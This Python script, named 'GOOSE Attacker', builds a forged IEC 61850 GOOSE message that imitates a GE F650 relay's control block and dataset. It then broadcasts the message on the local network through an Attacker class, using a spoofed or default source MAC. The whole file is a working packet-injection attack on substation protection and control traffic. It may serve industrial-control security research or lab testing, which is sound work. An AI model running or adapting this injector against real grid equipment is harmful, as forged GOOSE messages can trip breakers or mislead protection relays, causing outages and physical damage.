from goose_lib.goose_attacker import Attacker
import argparse
from uuid import getnode
import time

goose_msg = {
    "appId"                 : 1,
    "gocbRef"               : b"GEDeviceF650/LLN0$GO$gcb01", # length = 26
    "timeAllowedToLive"     : 4000,                         # 2 bytes and positive
    "datSet"                : b"GEDeviceF650/LLN0$GOOSE1",   # length = 24
    "goId"                  : b"GEDevGOOSE1",                # length = 11
    "t"                     : time.time(),
    "stNum"                 : 1,
    "sqNum"                 : 1,
    "simulation"            : False,
    "confRev"               : 1,
    "ndsCom"                : False,
    "numDatSetEntries"      : 0,
    "allData"               : None
    #default allData in wireshark
    #b"\x83\x01\x00\x84\x03\x03\x00\x00\x83\x01\x00\x84\x03\x03\x00\x00\x83\x01\x00\x84\x03\x03\x00\x00\x83\x01\x00\x84\x03\x03\x00\x00"
}

def get_src_mac():
        return (':'.join(['{:02x}'.format((getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GOOSE Attacker")
    parser.add_argument('-s', '--src', help="source MAC",required=False, default=get_src_mac())
    parser.add_argument('-d', '--dst', help="destination MAC",required=False, default="ff:ff:ff:ff:ff:ff")
    args = parser.parse_args()
    
    goose_attacker = Attacker(args.src, args.dst)
    goose_attacker.send_packet(goose_msg)